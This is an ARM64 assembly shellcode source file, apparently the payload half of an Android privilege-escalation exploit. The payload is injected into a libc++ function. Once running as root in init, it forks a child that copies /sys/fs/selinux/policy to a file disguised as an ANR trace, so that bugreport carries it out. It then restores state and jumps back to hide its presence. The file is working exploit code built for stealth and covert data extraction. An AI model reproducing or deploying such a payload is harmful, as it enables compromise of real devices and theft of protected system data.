.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"

toybox_path:
    .asciz "/system/bin/toybox"
cmd_cp:
    .asciz "cp"
policy_src:
    .asciz "/sys/fs/selinux/policy"
// 注意：这里伪装成 ANR 的日志文件，方便被 bugreport 打包
policy_dst:
    .asciz "/data/anr/anr_policy_trace.txt" 
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护 (8个 stp + 1个 str = 9 * 16 = 144 字节)
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    tbnz    w0, #31, return

    sub     sp, sp, 16

    // 4. clone 子进程
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    mov     x8, SYS_clone
    add     x4, sp, 8
    mov     x3, xzr
    mov     x2, xzr
    mov     x1, xzr
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]
    add     sp, sp, 16

    cbnz    w0, return          

worker:
    // 分配 64 字节栈空间存放 argv (5个指针 = 40字节，16字节对齐)
    sub     sp, sp, 64

    // 5. 构造 argv: ["/system/bin/toybox", "cp", "src", "dst", NULL]
    adr     x1, toybox_path
    str     x1, [sp, 0]
    
    adr     x1, cmd_cp
    str     x1, [sp, 8]
    
    adr     x1, policy_src
    str     x1, [sp, 16]
    
    adr     x1, policy_dst
    str     x1, [sp, 24]
    
    str     xzr, [sp, 32] // NULL 结尾

    // 6. execve("/system/bin/toybox", argv, NULL)
    adr     x0, toybox_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    // execve 失败则恢复栈并清理
    add     sp, sp, 64
    b       cleanup_df

cleanup_df:
    // 强制删除 /dev/df (保证下次能跑)
    mov     x0, -100
    adr     x1, mutex_file
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    // 现场恢复
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

libcxx_first_inst_copy:
    // 原函数第一条指令，防止 exp.c 的 jmpback 导致崩溃
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
